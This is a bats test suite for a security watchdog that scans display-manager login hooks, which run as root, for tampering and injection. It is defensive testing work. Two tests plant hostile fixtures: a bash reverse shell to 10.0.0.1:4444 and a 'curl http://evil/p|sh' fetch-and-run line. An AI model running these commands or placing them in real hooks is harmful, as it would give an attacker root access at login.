#!/usr/bin/env bats
# L2 bats functional tests for the display-manager-hooks-watchdog scan script.
#
# Display managers run their hook scripts (GDM PostLogin/PreSession, LightDM
# greeter/session-setup, SDDM scripts, …) AS ROOT around graphical login — a
# login-triggered root-exec surface. A planted hook that is world-writable /
# non-root-owned, or contains a command-injection pattern, is alert (T1546).
#
# Run with: bats packaging/test/L2-display-manager-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/display-manager-hooks-watchdog/systemd/display-manager-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/PostLogin"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DMHOOK_PROFILE="${PROFILE:-report}" \
    SELFDEF_DMHOOK_BASELINE="${BASELINE}" \
    SELFDEF_DMHOOK_DIRS="${DIRS_V:-$HOOKD}" \
    SELFDEF_DMHOOK_FILES="${TMP}/no-extra-file" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# Default\nexit 0\n' > "${HOOKD}/Default"
}

@test "no display-manager hooks → ok / no_dm_hooks" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_dm_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hook, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / dm_hooks_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dm_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a hook with an injection pattern → alert / dm_hooks_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dm_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable hook → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign hook change → warn / dm_hooks_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# Default updated\ntrue\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"dm_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned hook is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious hook" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/Default"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
